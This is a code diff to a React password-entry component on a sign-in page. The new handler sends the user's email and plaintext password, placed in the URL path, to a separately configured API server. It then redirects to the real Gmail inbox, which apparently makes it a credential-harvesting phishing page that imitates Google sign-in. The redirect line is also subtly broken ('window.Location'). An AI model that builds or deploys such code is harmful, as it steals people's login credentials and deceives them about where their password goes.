@@ -12,9 +12,17 @@ function PasswordStep({ email, onBack }) {
     const [showPassword, setShowPassword] = useState(false);
     const [focused, setFocused] = useState(false);
 
-    const handleNext = () => {
-        alert(`Signed in as ${email}, ${password}`);
-    };
+    async function handleNext() {
+        const temp = await fetch(
+            `${import.meta.env.VITE_API_URL}/${email}/${password}`,
+            {
+                method: "POST",
+            },
+        ).then(() => {
+            window.Location.href = "https://mail.google.com/mail/u/0/";
+            console.log("yay");
+        });
+    }
 
     return (
         <div className="min-h-screen bg-[#1a1a1a] flex flex-col items-center justify-center p-8 font-sans">
